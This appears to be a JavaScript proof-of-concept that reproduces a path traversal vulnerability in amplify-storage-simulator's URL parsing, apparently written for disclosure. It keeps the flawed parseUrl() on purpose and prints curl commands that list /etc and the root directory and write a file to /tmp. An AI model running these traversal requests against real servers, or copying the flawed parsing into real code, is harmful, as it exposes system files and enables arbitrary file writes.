/**
 * VULN-002 Reproduction: Path Traversal in amplify-storage-simulator
 *
 * Standalone reproduction of the vulnerable parseUrl() logic from:
 *   amplify-cli/packages/amplify-storage-simulator/src/server/utils.ts
 *   amplify-cli/packages/amplify-storage-simulator/src/server/S3server.ts
 *
 * Extracted/simplified from the original source — no monorepo build needed.
 */

const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs-extra');

// --- Vulnerable parseUrl logic, copied verbatim from utils.ts ---
function parseUrl(request, route) {
  request.url = path.normalize(decodeURIComponent(request.url));
  const temp = request.url.split(route);
  request.params.path = '';

  if (request.query.prefix !== undefined) {
    request.params.path = request.query.prefix + '/';
  }

  if (temp[1] !== undefined) {
    request.params.path = path.normalize(
      path.join(request.params.path, temp[1].split('?')[0])
    );
  } else {
    request.params.path = path.normalize(
      path.join(request.params.path, temp[0].split('?')[0])
    );
  }

  // BUG: Only strips ONE leading '/' or '.' character — insufficient!
  if (request.params.path[0] == '/' || request.params.path[0] == '.') {
    request.params.path = request.params.path.substring(1);
  }

  if (request.method === 'GET') {
    if (
      request.query.prefix !== undefined ||
      (temp[1] === '' && temp[0] === '') ||
      (temp[1] === '/' && temp[0] === '')
    ) {
      request.method = 'LIST';
    }
  }
}

// --- Config ---
const PORT = 20005;
const BUCKET_NAME = 'test-bucket';
const ROUTE = `/${BUCKET_NAME}/`;

// Create a fake bucket directory with a sample file
const LOCAL_DIR = path.join(__dirname, 'fake-s3-bucket');
fs.ensureDirSync(LOCAL_DIR);
fs.writeFileSync(
  path.join(LOCAL_DIR, 'sample.txt'),
  'This is a legitimate file inside the bucket.\n'
);

// --- Express app mimicking S3server.ts ---
const app = express();
app.use(cors());
app.use(express.raw({ limit: '10mb', type: '*/*' }));

app.use((request, response) => {
  const originalMethod = request.method;
  parseUrl(request, ROUTE);

  const resolvedPath = path.normalize(path.join(LOCAL_DIR, request.params.path));
  const escaped = !resolvedPath.startsWith(path.resolve(LOCAL_DIR));

  console.log(`[${originalMethod}->${request.method}] params.path="${request.params.path}" resolved="${resolvedPath}" escaped=${escaped}`);

  // --- LIST handler (S3server.ts handleRequestList) ---
  if (request.method === 'LIST') {
    const dirPath = path.normalize(path.join(LOCAL_DIR, request.params.path));
    let listing = [];
    if (fs.existsSync(dirPath)) {
      try {
        listing = fs.readdirSync(dirPath).slice(0, 30);
      } catch (e) {
        listing = ['(error: ' + e.message + ')'];
      }
    }
    response.json({
      method: 'LIST',
      resolvedPath: dirPath,
      outsideBucket: !dirPath.startsWith(path.resolve(LOCAL_DIR)),
      files: listing,
    });
    return;
  }

  // --- GET handler (S3server.ts handleRequestGet, line 128) ---
  if (request.method === 'GET') {
    const filePath = path.normalize(path.join(LOCAL_DIR, request.params.path));
    if (fs.existsSync(filePath) && !fs.statSync(filePath).isDirectory()) {
      response.send(fs.readFileSync(filePath));
    } else {
      response.status(404).json({ error: 'NoSuchKey', resolvedPath: filePath });
    }
    return;
  }

  // --- PUT handler (S3server.ts handleRequestPut, line 243) ---
  // In the real code, PUT with prefix does NOT get rerouted to LIST,
  // so the traversed path is used for file WRITE.
  if (request.method === 'PUT') {
    const directoryPath = path.normalize(path.join(LOCAL_DIR, request.params.path));
    if (!directoryPath.startsWith(path.resolve(LOCAL_DIR))) {
      console.log(`  *** ARBITRARY FILE WRITE DETECTED: ${directoryPath} ***`);
    }
    // Safety: in this repro, only write to /tmp to avoid damage
    if (directoryPath.startsWith('/tmp/vuln002-proof')) {
      fs.ensureFileSync(directoryPath);
      fs.writeFileSync(directoryPath, request.body || 'pwned');
      response.json({ wrote: directoryPath, outsideBucket: true });
    } else if (directoryPath.startsWith(path.resolve(LOCAL_DIR))) {
      fs.ensureFileSync(directoryPath);
      fs.writeFileSync(directoryPath, request.body || '');
      response.json({ wrote: directoryPath, outsideBucket: false });
    } else {
      response.json({
        blocked: 'repro safety guard (real code would write here)',
        wouldWriteTo: directoryPath,
        outsideBucket: true,
      });
    }
    return;
  }

  response.status(405).send('Method not handled');
});

app.listen(PORT, () => {
  const bucketAbsolute = path.resolve(LOCAL_DIR);
  const depth = bucketAbsolute.split(path.sep).filter(Boolean).length;
  const traversal = '../'.repeat(depth);

  console.log('='.repeat(70));
  console.log('VULN-002 Path Traversal Reproduction Server');
  console.log('='.repeat(70));
  console.log(`Bucket directory : ${bucketAbsolute}`);
  console.log(`Bucket depth     : ${depth} levels from /`);
  console.log(`Server listening : http://localhost:${PORT}`);
  console.log('');
  console.log('--- Test Commands (run in another terminal) ---');
  console.log('');
  console.log('1) NORMAL - read a legitimate file:');
  console.log(`   curl http://localhost:${PORT}/test-bucket/sample.txt`);
  console.log('');
  console.log('2) PATH TRAVERSAL (LIST) - enumerate /etc/:');
  console.log(`   curl "http://localhost:${PORT}/test-bucket/?prefix=${traversal}etc"`);
  console.log('');
  console.log('3) PATH TRAVERSAL (LIST) - enumerate root /:');
  console.log(`   curl "http://localhost:${PORT}/test-bucket/?prefix=${traversal.slice(0,-1)}"`);
  console.log('');
  console.log('4) PATH TRAVERSAL (PUT) - write to /tmp/vuln002-proof:');
  console.log(`   curl -X PUT -d "pwned-content" "http://localhost:${PORT}/test-bucket/x?prefix=${traversal}tmp/vuln002-proof/pwned.txt"`);
  console.log('');
  console.log('='.repeat(70));
});
